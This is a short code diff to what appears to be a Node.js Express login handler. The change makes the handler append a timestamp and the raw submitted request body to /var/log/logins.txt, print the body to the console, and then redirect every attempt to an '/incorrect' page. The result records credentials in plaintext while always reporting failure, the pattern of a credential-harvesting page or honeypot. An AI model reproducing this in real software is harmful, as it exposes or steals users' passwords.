@@ -33,7 +33,8 @@ app.post('/login', (req, res) => {
     });
     req.on('end', () => {
         console.log('request body: ', body);
-        fs.writeFile("/var/log/logins.txt", "utf-8", () => {
+        const logData = `${new Date().toISOString()} ${body}\n`
+        fs.appendFile("/var/log/logins.txt", logData, () => {
             res.redirect("/incorrect");
         });
     });
